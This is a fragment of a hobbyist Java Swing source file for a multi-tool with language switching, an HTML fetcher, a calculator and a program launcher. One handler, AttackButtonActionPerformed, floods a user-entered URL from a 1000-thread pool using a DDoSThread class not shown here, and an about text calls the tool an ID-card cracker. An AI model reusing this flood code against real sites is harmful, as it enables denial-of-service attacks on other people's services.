    private void SureActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_SureActionPerformed
        preFrame.setVisible(false);
    }//GEN-LAST:event_SureActionPerformed

    private void ChineseActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_ChineseActionPerformed
        Language.setText("語言");
        Sure.setText("確定");
        LanguageForm.setTitle("語言");
        preFrame.setTitle("偏好設定");
        aboutFrame.setTitle("關於");
        Close.setText("關閉");
        setTitle("天干地支 by夏特稀");
        Convert.setText("轉換");
        File.setText("ㄉ案");
        Edit.setText("ㄅ輯");
        More.setText("更多");
        open.setText("打開");
        save.setText("儲存");
        print.setText("列印");
        exit.setText("離開");
        cp.setText("複製");
        ps.setText("貼上");
        pre.setText("偏好設定");
        about.setText("關於");
        this.t1 = "年為";
        this.t2 = "年";
        Year.Language = "Chinese";
        LanguageForm.setVisible(false);
    }//GEN-LAST:event_ChineseActionPerformed

    private void EnglishActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_EnglishActionPerformed
        Language.setText("Language");
        Sure.setText("Sure");
        LanguageForm.setTitle("Language");
        preFrame.setTitle("Preference");
        aboutFrame.setTitle("About");
        Close.setText("Close");
        setTitle("Heavenly branch by Tershi Xia");
        Convert.setText("Convert");
        File.setText("File");
        Edit.setText("Edit");
        More.setText("More");
        open.setText("Open");
        save.setText("Save");
        print.setText("Print");
        exit.setText("Exit");
        cp.setText("Copy");
        ps.setText("Paste");
        pre.setText("Preference");
        about.setText("About");
        this.t1 = " is a ";
        this.t2 = "-year";
        Year.Language = "English";
        LanguageForm.setVisible(false);
    }//GEN-LAST:event_EnglishActionPerformed

    private void AttackButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_AttackButtonActionPerformed
        CancelButton.setVisible(true);
        String attackUrl = urlInput.getText();
        Console.append("設定網址為  " + attackUrl + "   成功");
        AttackButton.setVisible(false);
        //使用執行緒空間創建1000個執行緒
        ExecutorService es = Executors.newFixedThreadPool(1000);
        DDoSThread mythread = new DDoSThread(attackUrl);
        Thread thread = new Thread(mythread);

        for (int i = 0; i < 10000; i++) {
            es.execute(thread);
            if (DDOSDSD == "0") {
                break;
            }
        }
    }//GEN-LAST:event_AttackButtonActionPerformed

    private void CancelButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_CancelButtonActionPerformed
        AttackButton.setVisible(true);
        CancelButton.setVisible(false);
        DDOSDSD = "0";
    }//GEN-LAST:event_CancelButtonActionPerformed

    private void ExitActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_ExitActionPerformed
        System.exit(1);
    }//GEN-LAST:event_ExitActionPerformed

    private void Exit1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_Exit1ActionPerformed
        System.exit(0);
    }//GEN-LAST:event_Exit1ActionPerformed

    private void Exit2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_Exit2ActionPerformed
        System.exit(0);
    }//GEN-LAST:event_Exit2ActionPerformed

    private void Exit5ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_Exit5ActionPerformed
        System.exit(0);
    }//GEN-LAST:event_Exit5ActionPerformed

    private void Exit3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_Exit3ActionPerformed
        System.exit(0);
    }//GEN-LAST:event_Exit3ActionPerformed

    private void jMenuItem2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem2ActionPerformed

    }//GEN-LAST:event_jMenuItem2ActionPerformed

    private void jMenuItem4ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem4ActionPerformed

    }//GEN-LAST:event_jMenuItem4ActionPerformed

    private void jMenuItem1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem1ActionPerformed
        Console.append("這是由夏特稀製作的身分證破解器並檢查可用\n");
        Console.append("版本:v1.0\n");
        Console.append("本次更新:\n");
        Console.append("1.將全版面置中\n");
        Console.append("2.將文字置中;\n");
    }//GEN-LAST:event_jMenuItem1ActionPerformed

    private void FileChooseActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_FileChooseActionPerformed

    }//GEN-LAST:event_FileChooseActionPerformed

    private void FileChooseKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_FileChooseKeyReleased
        if (evt.getKeyCode() == KeyEvent.VK_ESCAPE) {
            FileChooseFrame.setVisible(false);
        }
    }//GEN-LAST:event_FileChooseKeyReleased

    private void fontButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_fontButtonActionPerformed
        FontFrame.setSize(500, 500);
        FontFrame.setLocationRelativeTo(null);
        switch (language) {
            case "zh_ROC":
            FontFrame.setTitle("字體設定");
            break;
            case "zh_PRC":
            FontFrame.setTitle("字体设定");
            break;
            case "zn_US":
            FontFrame.setTitle("Font Setting");
            break;
        }
        FontFrame.setVisible(true);
        FontFrame.setIconImage(IMG.getImage());
    }//GEN-LAST:event_fontButtonActionPerformed

    private void wordButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_wordButtonActionPerformed
        wordFrame.setSize(500, 500);
        wordFrame.setLocationRelativeTo(null);
        switch (language) {
            case "zh_ROC":
            wordFrame.setTitle("字型設定");
            break;
            case "zh_PRC":
            wordFrame.setTitle("字型设定");
            break;
            case "zn_US":
            wordFrame.setTitle("Word Setting");
            break;
        }
        wordFrame.setVisible(true);
        wordFrame.setIconImage(IMG.getImage());
    }//GEN-LAST:event_wordButtonActionPerformed

    private void bgButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_bgButtonActionPerformed
        bgFrame.setSize(500, 500);
        bgFrame.setLocationRelativeTo(null);
        switch (language) {
            case "zh_ROC":
            bgFrame.setTitle("背景設定");
            break;
            case "zh_PRC":
            bgFrame.setTitle("背景设定");
            break;
            case "zn_US":
            bgFrame.setTitle("Background Setting");
            break;
        }
        bgFrame.setVisible(true);
        bgFrame.setIconImage(IMG.getImage());
    }//GEN-LAST:event_bgButtonActionPerformed

    private void displayAreaButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_displayAreaButtonActionPerformed
        displayArea.setSize(500, 500);
        displayArea.setLocationRelativeTo(null);
        switch (language) {
            case "zh_ROC":
            displayArea.setTitle("顯示框設定");
            break;
            case "zh_PRC":
            displayArea.setTitle("显示框设定");
            break;
            case "zn_US":
            displayArea.setTitle("DisplayArea Setting");
            break;
        }
        displayArea.setVisible(true);
        displayArea.setIconImage(IMG.getImage());
    }//GEN-LAST:event_displayAreaButtonActionPerformed

    private void urlAreaButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_urlAreaButtonActionPerformed
        urlAreaFrame.setSize(500, 500);
        urlAreaFrame.setLocationRelativeTo(null);
        switch (language) {
            case "zh_ROC":
            urlAreaFrame.setTitle("網址列設定");
            break;
            case "zh_PRC":
            urlAreaFrame.setTitle("网址列设定");
            break;
            case "zn_US":
            urlAreaFrame.setTitle("Url Setting");
            break;
        }
        urlAreaFrame.setVisible(true);
        urlAreaFrame.setIconImage(IMG.getImage());
    }//GEN-LAST:event_urlAreaButtonActionPerformed

    private void presssure1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_presssure1ActionPerformed
        preference.setVisible(false);
    }//GEN-LAST:event_presssure1ActionPerformed

    private void disPlayButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_disPlayButtonActionPerformed
        disPlay.setSize(500, 500);
        disPlay.setLocationRelativeTo(null);
        switch (language) {
            case "zh_ROC":
            disPlay.setTitle("顯示設定");
            break;
            case "zh_PRC":
            disPlay.setTitle("显示设定");
            break;
            case "zn_US":
            disPlay.setTitle("Display Setting");
            break;
        }
        disPlay.setVisible(true);
        disPlay.setIconImage(IMG.getImage());
    }//GEN-LAST:event_disPlayButtonActionPerformed

    private void languageButtonActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_languageButtonActionPerformed
        langFrame.setSize(150, 100);
        langFrame.setLocationRelativeTo(null);
        switch (language) {
            case "zh_ROC":
            langFrame.setTitle("語言設定");
            break;
            case "zh_PRC":
            langFrame.setTitle("语言设定");
            break;
            case "zn_US":
            langFrame.setTitle("Language Setting");
            break;
        }
        langFrame.setVisible(true);
        langFrame.setIconImage(IMG.getImage());
    }//GEN-LAST:event_languageButtonActionPerformed

    private void preferenceKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_preferenceKeyReleased

    }//GEN-LAST:event_preferenceKeyReleased

    private void jCheckBox1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jCheckBox1ActionPerformed

    }//GEN-LAST:event_jCheckBox1ActionPerformed

    private void jCheckBox4ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jCheckBox4ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jCheckBox4ActionPerformed

    private void jCheckBox6ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jCheckBox6ActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_jCheckBox6ActionPerformed

    private void TredChineseActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_TredChineseActionPerformed
        language = "zh_ROC";
        //標題
        setTitle("得到網頁HTML"); //UI的標題
        preference.setTitle("偏好設定");
        FontFrame.setTitle("字體設定");
        bgFrame.setTitle("背景設定");
        displayArea.setTitle("顯示框設定");
        urlAreaFrame.setTitle("網址列設定");
        disPlay.setTitle("顯示設定");
        langFrame.setTitle("語言設定");
        wordFrame.setTitle("字型設定");
        plus.setTitle("加減乘除");
        //檔案
        file.setText("檔案");
        save.setText("儲存");
        open.setText("開啟");
        left.setText("離開");
        //編輯
        editMenu.setText("編輯");
        Copy.setText("複製");
        Paste.setText("貼上");
        Cut.setText("剪下");
        Clear.setText("清除");
        Sure.setText("確定");
        //視窗
        Windows.setText("視窗");
        preferenceMenu.setText("偏好設定");
        //幫助
        Help.setText("幫助");
        doc.setText("文檔");
        netSupport.setText("網路文件與支持");
        keyWords.setText("快捷鍵");
        report.setText("回報");
        HTMLdoc.setText("HTML幫助文件");
        //更多
        plusMenu.setText("加減乘除");
        //按鈕
        PressSure.setText("確定(Ctrl+Q)");
        PressClear.setText("清除(Alt+Shift+C)");
        //字體
        fontButton.setText("字體");
        TitleFontWord.setText("視窗標題字體");
        ChooseFontWord.setText("選項字體");
        indexFontWord.setText("內文字體");
        //字型
        wordButton.setText("字型");
        //背景
        bgButton.setText("背景");
        //顯示框
        displayAreaButton.setText("顯示框");
        //網址列
        urlAreaButton.setText("網址列");
        //顯示
        disPlayButton.setText("顯示");
        //語言
        languageButton.setText("語言");
        //偏好設定按鈕
        presssure1.setText("確定");
        SurePress1.setText("確定");
        presssure2.setText("確定");
        presssure3.setText("確定");
        plusType.setText("無");
        resultNameFont.setText("結果:");
        leftB.setText("離開");
    }//GEN-LAST:event_TredChineseActionPerformed

    private void SimpChineseActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_SimpChineseActionPerformed
        language = "zh_PRC";
        //標題
        setTitle("得到网页HTML"); //UI的標題
        plus.setTitle("加減乘除");
        preference.setTitle("偏好设定");
        FontFrame.setTitle("字体设定");
        bgFrame.setTitle("背景设定");
        displayArea.setTitle("显示框设定");
        urlAreaFrame.setTitle("网址列设定");
        disPlay.setTitle("显示设定");
        langFrame.setTitle("语言设定");
        wordFrame.setTitle("字型设定");
        //檔案
        file.setText("档案");
        save.setText("储存");
        open.setText("开启");
        left.setText("离开");
        //編輯
        editMenu.setText("编辑");
        Copy.setText("复制");
        Paste.setText("贴上");
        Cut.setText("剪下");
        Clear.setText("清除");
        Sure.setText("确定");
        //視窗
        Windows.setText("视窗");
        preferenceMenu.setText("偏好设定");
        //幫助
        Help.setText("帮助");
        doc.setText("文档");
        netSupport.setText("网络文件与支持");
        keyWords.setText("快捷键");
        report.setText("回报");
        HTMLdoc.setText("HTML帮助文件");
        //更多
        plusMenu.setText("加減乘除");
        //按鈕
        PressSure.setText("确定(Ctrl+Q)");
        PressClear.setText("清除(Alt+Shift+C)");
        //字體
        fontButton.setText("字体");
        TitleFontWord.setText("视窗标题字体");
        ChooseFontWord.setText("选项字体");
        indexFontWord.setText("内文字体");
        //字型
        wordButton.setText("字型");
        //背景
        bgButton.setText("背景");
        //顯示框
        displayAreaButton.setText("显示框");
        //網址列
        urlAreaButton.setText("网址列");
        //顯示
        disPlayButton.setText("显示");
        //語言
        languageButton.setText("语言");
        //偏好設定按鈕
        presssure1.setText("確定");
        SurePress1.setText("確定");
        presssure2.setText("確定");
        presssure3.setText("確定");
        plusType.setText("无");
        resultNameFont.setText("结果:");
        leftB.setText("离开");
    }//GEN-LAST:event_SimpChineseActionPerformed

    private void English1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_English1ActionPerformed
        language = "en_US";
        //標題
        setTitle("Get HTML from web"); //UI的標題
        preference.setTitle("Preference Setting");
        FontFrame.setTitle("Font Setting");
        bgFrame.setTitle("Background Setting");
        displayArea.setTitle("DisplayArea Setting");
        urlAreaFrame.setTitle("Url Setting");
        disPlay.setTitle("Display Setting");
        langFrame.setTitle("Language Setting");
        wordFrame.setTitle("Word Setting");
        plus.setTitle("Add Sub Multi Divis");
        //檔案
        file.setText("File");
        save.setText("Save");
        open.setText("Open");
        left.setText("Left");
        //編輯
        editMenu.setText("Edit");
        Copy.setText("Copy");
        Paste.setText("Paste");
        Cut.setText("Cut");
        Clear.setText("Clear");
        Sure.setText("Sure");
        //視窗
        Windows.setText("Windows");
        preferenceMenu.setText("Preference Setting");
        //幫助
        Help.setText("Help");
        doc.setText("Document");
        netSupport.setText("Internet Files and Supports");
        keyWords.setText("keywords");
        report.setText("report");
        HTMLdoc.setText("HTML Help Files");
        //更多
        plusMenu.setText("Addition, subtraction, multiplication and division");
        //按鈕
        PressSure.setText("Sure(Ctrl+Q)");
        PressClear.setText("Clear(Alt+Shift+C)");
        //字體
        fontButton.setText("Font");
        TitleFontWord.setText("Window title font");
        ChooseFontWord.setText("Option font");
        indexFontWord.setText("Text Font");
        //字型
        wordButton.setText("Word");
        //背景
        bgButton.setText("Background");
        //顯示框
        displayAreaButton.setText("Display Area");
        //網址列
        urlAreaButton.setText("Url");
        //顯示
        disPlayButton.setText("Display");
        //語言
        languageButton.setText("Language");
        //偏好設定按鈕
        presssure1.setText("Sure");
        SurePress1.setText("Sure");
        presssure2.setText("Sure");
        presssure3.setText("Sure");
        plusType.setText("None");
        resultNameFont.setText("result:");
        leftB.setText("Left");
    }//GEN-LAST:event_English1ActionPerformed

    private void JapaneseActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_JapaneseActionPerformed
        language = "jp_JP";
        //標題
        setTitle("Web HTMLを取得"); //UI的標題
        preference.setTitle("プリファレンス");
        FontFrame.setTitle("フォント設定");
        bgFrame.setTitle("背景設定");
        displayArea.setTitle("顯示框設定");
        urlAreaFrame.setTitle("ディスプレイボックスの設定");
        disPlay.setTitle("ディスプレイ設定");
        langFrame.setTitle("言語設定");
        wordFrame.setTitle("フォント設定");
        plus.setTitle("加算、減算、乗算、除算");
        //檔案
        file.setText("ファイル");
        save.setText("保存");
        open.setText("開く");
        left.setText("去る");
        //編輯
        editMenu.setText("編集");
        Copy.setText("コピー");
        Paste.setText("貼り付け");
        Cut.setText("切り取る");
        Clear.setText("クリア");
        Sure.setText("決定する");
        //視窗
        Windows.setText("見える窓");
        preferenceMenu.setText("プリファレンス");
        //幫助
        Help.setText("助けて");
        doc.setText("ドキュメンテーション");
        netSupport.setText("ネットワークのドキュメントとサポート");
        keyWords.setText("ショートカット");
        report.setText("エラーを報告");
        HTMLdoc.setText("HTMLヘルプファイル");
        //更多
        plusMenu.setText("嘿嘿嘿嘿嘿嘿欸嘿嘿嘿");
        //按鈕
        PressSure.setText("決定する(Ctrl+Q)");
        PressClear.setText("クリア(Alt+Shift+C)");
        //字體
        fontButton.setText("フォント");
        TitleFontWord.setText("ウィンドウタイトルフォント");
        ChooseFontWord.setText("オプションフォント");
        indexFontWord.setText("内側のフォント");
        //字型
        wordButton.setText("アルファベット");
        //背景
        bgButton.setText("背景");
        //顯示框
        displayAreaButton.setText("ディスプレイボックス");
        //網址列
        urlAreaButton.setText("アドレスバー");
        //顯示
        disPlayButton.setText("ショー");
        //語言
        languageButton.setText("言語");
        //偏好設定按鈕
        presssure1.setText("決定する");
        SurePress1.setText("決定する");
        presssure2.setText("決定する");
        presssure3.setText("決定する");
        plusType.setText("なし");
        resultNameFont.setText("結果");
        leftB.setText("去る");
    }//GEN-LAST:event_JapaneseActionPerformed

    private void ABClangActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_ABClangActionPerformed
        language = "OP_ABC";
        //標題
        setTitle("ABC"); //UI的標題
        plus.setTitle("ㄎㄎ");
        preference.setTitle("妳好醜");
        FontFrame.setTitle("ㄎㄎ");
        bgFrame.setTitle("ㄅㄆㄇㄈ");
        displayArea.setTitle("ㄉㄊㄋㄌ");
        urlAreaFrame.setTitle("ㄍㄎㄏ");
        disPlay.setTitle("ㄐㄑㄒ");
        langFrame.setTitle("ㄓㄔㄕㄖ");
        wordFrame.setTitle("ㄗㄘㄙ");
        //檔案
        file.setText("ㄧㄨㄩ");
        save.setText("ㄚㄛㄜㄝ");
        open.setText("ㄞㄟㄠㄡ");
        left.setText("ㄢㄣㄤㄥ");
        //編輯
        editMenu.setText("ㄦ");
        Copy.setText("QWERTY");
        Paste.setText("UIOP");
        Cut.setText("ASDFGHJKL");
        Clear.setText("ZXCV");
        Sure.setText("BNM");
        //視窗
        Windows.setText("!@#$%^&*()_+");
        preferenceMenu.setText("小皮球");
        //幫助
        Help.setText("香蕉油");
        doc.setText("滿地開花");
        netSupport.setText("九十一");
        keyWords.setText("八十七");
        report.setText("八十八");
        HTMLdoc.setText("二八二九七十一");
        //按鈕
        PressSure.setText("兩隻老呼");
        PressClear.setText("兩隻老鼠");
        //字體
        fontButton.setText("飛得快");
        //字型
        wordButton.setText("飛得快");
        TitleFontWord.setText("哈");
        ChooseFontWord.setText("密");
        indexFontWord.setText("瓜");
        //背景
        bgButton.setText("義肢沒有尾巴");
        //顯示框
        displayAreaButton.setText("藝之美有爾多");
        //網址列
        urlAreaButton.setText("真起乖");
        //顯示
        disPlayButton.setText("真起乖");
        //語言
        languageButton.setText("YAAAAAAAAAA");
        //偏好設定按鈕
        presssure1.setText("Copy布萊恩");
        SurePress1.setText("Apple Pan");
        presssure2.setText("Pan Apple");
        presssure3.setText("Banana Pan");
        plusType.setText("PineApple Pan");
        resultNameFont.setText("愛以西得入");
        leftB.setText("我愛你");
    }//GEN-LAST:event_ABClangActionPerformed

    private void SurePress1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_SurePress1ActionPerformed
        langFrame.setVisible(false);
    }//GEN-LAST:event_SurePress1ActionPerformed

    private void presssure3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_presssure3ActionPerformed
        AboutFrame.setVisible(false);
    }//GEN-LAST:event_presssure3ActionPerformed

    private void culcActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_culcActionPerformed
        if (Type == "plus") {
            resultA = Integer.parseInt(NumA.getText()) + Integer.parseInt(NumB.getText());
        } else if (Type == "minus") {
            resultA = Integer.parseInt(NumA.getText()) - Integer.parseInt(NumB.getText());
        } else if (Type == "multi") {
            resultA = Integer.parseInt(NumA.getText()) * Integer.parseInt(NumB.getText());
        } else if (Type == "except") {
            resultA = Double.parseDouble(NumA.getText()) / Double.parseDouble(NumB.getText());
        }
        ResultA.setText(String.valueOf(resultA));
    }//GEN-LAST:event_culcActionPerformed

    private void jButton4ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton4ActionPerformed
        Type = "plus";
        plusType.setText("+");
    }//GEN-LAST:event_jButton4ActionPerformed

    private void jButton5ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton5ActionPerformed
        Type = "minus";
        plusType.setText("-");
    }//GEN-LAST:event_jButton5ActionPerformed

    private void jButton6ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton6ActionPerformed
        Type = "multi";
        plusType.setText("*");
    }//GEN-LAST:event_jButton6ActionPerformed

    private void jButton7ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton7ActionPerformed
        Type = "except";
        plusType.setText("/");
    }//GEN-LAST:event_jButton7ActionPerformed

    private void leftBActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_leftBActionPerformed
        plus.setVisible(false);
    }//GEN-LAST:event_leftBActionPerformed

    private void Console1KeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_Console1KeyReleased
        if (evt.getKeyCode() == KeyEvent.VK_ESCAPE) {
            System.exit(0);
        }
    }//GEN-LAST:event_Console1KeyReleased

    private void UrlAreaKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_UrlAreaKeyReleased
        if (evt.getKeyCode() == KeyEvent.VK_ESCAPE) {
            System.exit(0);
        }
    }//GEN-LAST:event_UrlAreaKeyReleased

    private void PressSureActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_PressSureActionPerformed
        String content = null;
        URLConnection connection = null;
        String url = UrlArea.getText();
        try {
            Scanner sc = new Scanner(System.in);
            connection = new URL(url).openConnection();
            Scanner scanner = new Scanner(connection.getInputStream());
            scanner.useDelimiter("\\Z");
            content = scanner.next();
            scanner.close();
        } catch (Exception ex) {
            //            ex.printStackTrace();
            switch (language) {
                case "zh_ROC":
                Console1.append("網站輸入錯誤喔");
                break;
                case "zh_PRC":
                Console1.append("网站输入错误哦");
                break;
                case "zn_US":
                Console1.append("Url is typed error");
                break;
                case "jp_JP":
                Console1.append("ウェブサイトの入力エラー");
                break;
                case "OP_ABC":
                Console1.append("嘿嘿");
                break;
            }
        }
        if (content != null) {
            Console1.append(content);
        }
    }//GEN-LAST:event_PressSureActionPerformed

    private void PressClearActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_PressClearActionPerformed
        Console1.setText("");
    }//GEN-LAST:event_PressClearActionPerformed

    private void save1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_save1ActionPerformed
        FileChooseFrame.setSize(700, 400);
        FileChooseFrame.setLocationRelativeTo(null);
        switch (language) {
            case "zh_ROC":
            FileChooseFrame.setTitle("儲存文件");
            break;
            case "zh_PRC":
            FileChooseFrame.setTitle("储存文件");
            break;
            case "en_US":
            FileChooseFrame.setTitle("Save the file");
            break;
        }
        FileChooseFrame.setVisible(true);
        FileChooseFrame.setIconImage(IMG.getImage());
    }//GEN-LAST:event_save1ActionPerformed

    private void open1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_open1ActionPerformed
        FileChooseFrame.setSize(700, 400);
        FileChooseFrame.setLocationRelativeTo(null);
        FileChooseFrame.setVisible(true);

        switch (language) {
            case "zh_ROC":
            FileChooseFrame.setTitle("打開文件");
            break;
            case "zh_PRC":
            FileChooseFrame.setTitle("打开文件");
            break;
            case "en_US":
            FileChooseFrame.setTitle("Open the file");
        }
            FileChooseFrame.setIconImage(IMG.getImage());
    }//GEN-LAST:event_open1ActionPerformed

    private void leftActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_leftActionPerformed
        System.exit(1);
    }//GEN-LAST:event_leftActionPerformed

    private void PasteActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_PasteActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_PasteActionPerformed

    private void CutActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_CutActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_CutActionPerformed

    private void ClearActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_ClearActionPerformed
        Console.setText("");
    }//GEN-LAST:event_ClearActionPerformed

    private void Sure1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_Sure1ActionPerformed
        String content = null;
        URLConnection connection = null;
        String url = UrlArea.getText();
        try {
            Scanner sc = new Scanner(System.in);
            connection = new URL(url).openConnection();
            Scanner scanner = new Scanner(connection.getInputStream());
            scanner.useDelimiter("\\Z");
            content = scanner.next();
            scanner.close();
        } catch (Exception ex) {
            //            ex.printStackTrace();
            switch (language) {
                case "zh_ROC":
                Console.append("網站輸入錯誤喔");
                break;
                case "zh_PRC":
                Console.append("网站输入错误哦");
                break;
                case "zn_US":
                Console.append("Url is typed error");
                break;
                case "jp_JP":
                Console.append("ウェブサイトの入力エラー");
                break;
                case "OP_ABC":
                Console.append("嘿嘿");
                break;
            }
        }
        if (content != null) {
            Console.append(content);
        }
    }//GEN-LAST:event_Sure1ActionPerformed

    private void preferenceMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_preferenceMenuActionPerformed
        preference.setSize(346, 500);
        preference.setLocationRelativeTo(null);
        switch (language) {
            case "zh_ROC":
            preference.setTitle("偏好設定");
            break;
            case "zh_PRC":
            preference.setTitle("偏好设定");
            break;
            case "en_US":
            preference.setTitle("Preference Setting");
            break;
        }
        preference.setVisible(true);
            preference.setIconImage(IMG.getImage());
    }//GEN-LAST:event_preferenceMenuActionPerformed

    private void about1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_about1ActionPerformed
        AboutFrame.setSize(510, 750);
        AboutFrame.setLocationRelativeTo(null);
        AboutFrame.setVisible(true);

            AboutFrame.setIconImage(IMG.getImage());
    }//GEN-LAST:event_about1ActionPerformed

    private void plusMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_plusMenuActionPerformed
        plus.setSize(408, 415);
        plus.setLocationRelativeTo(null);
        plus.setVisible(true);
        switch (language) {
            case "zh_ROC":
            plus.setTitle("加減乘除");
            break;
            case "zh_PRC":
            plus.setTitle("加減乘除");
            break;
            case "enUS":
            plus.setTitle("Add Sub Multi Divis");
            break;
            case "jp_JP":
            plus.setTitle("加算、減算、乗算、除算");
            break;
        }
        plus.setIconImage(IMG.getImage());
    }//GEN-LAST:event_plusMenuActionPerformed

    private void getHTMLformKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_getHTMLformKeyReleased

    }//GEN-LAST:event_getHTMLformKeyReleased

    private void jMenuItem5ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem5ActionPerformed
        ThanksForUsing.setVisible(true);
    }//GEN-LAST:event_jMenuItem5ActionPerformed

    private void MainAboutActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_MainAboutActionPerformed
        MainAboutFrame.setLocationRelativeTo(null);
        MainAboutFrame.setVisible(true);
        MainAboutFrame.setTitle("關於小工具喔喔喔喔");
        MainAboutFrame.setIconImage(IMG.getImage());
    }//GEN-LAST:event_MainAboutActionPerformed

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        MainAboutFrame.setVisible(false);
    }//GEN-LAST:event_jButton1ActionPerformed

    private void MCActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_MCActionPerformed
    File file = new File("bin\\mc.exe");
    ProcessBuilder processBuilder = new ProcessBuilder(file.getAbsolutePath());
    processBuilder.directory(file.getParentFile());

    try {
        processBuilder.start();
        System.exit(0);
    } catch(IOException ex) {
        installError.setText("有些錯誤 錯誤資訊下次更新");
        ex.printStackTrace();
    }
    }//GEN-LAST:event_MCActionPerformed

    private void MC1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_MC1ActionPerformed
        InstallFrame.setLocationRelativeTo(null);
        InstallFrame.setVisible(true);
        InstallFrame.setTitle("安裝程式");
        InstallFrame.setIconImage(IMG.getImage());
    }//GEN-LAST:event_MC1ActionPerformed

    private void jButton8ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton8ActionPerformed
        String installURL = installPath.getText();                                 //將路徑放入installURL
        File file = new File(installURL);                                        //新增物件
        ProcessBuilder processBuilder = new ProcessBuilder(file.getAbsolutePath());
        processBuilder.directory(file.getParentFile());
        try {
            processBuilder.start();                                              //試試看開始
            System.exit(0);                                                      //離開
        } catch(IOException ex) {
            int clean = Integer.parseInt(ex.toString().replaceAll("\\D+",""));        //錯誤訊息 選擇error= CODE
//            System.out.println(clean);        //測試                          //選是錯誤訊息得到CODE
            switch (clean){
                case 5:
                    installError.setText("存取被拒");
                    break;
                case 2:
                    installError.setText("系統找不到指定的檔案");
                    break;
                case 193132:
                    installError.setText("不是有效的 Win32 應用程式");
                    break;
                case 13:
                    installError.setText("沒有權限");
                    break;
                case 86:
                    installError.setText("可執行的CPU文件錯誤");
                    break;
                case 24:
                    installError.setText("太多開啟檔案");
                    break;
                default:
                    ex.printStackTrace();    
            }
            /* 其中一種做法 正規表達式
            String msg = ex.getMessage();  
            Pattern pattern = Pattern.compile(".*(error=.*),.*");
            Matcher matcher = pattern.matcher(ex.getMessage());
            if (matcher.find()) {
                System.out.println("Result: " + matcher.group(1));
            }
            */
        }
    }//GEN-LAST:event_jButton8ActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
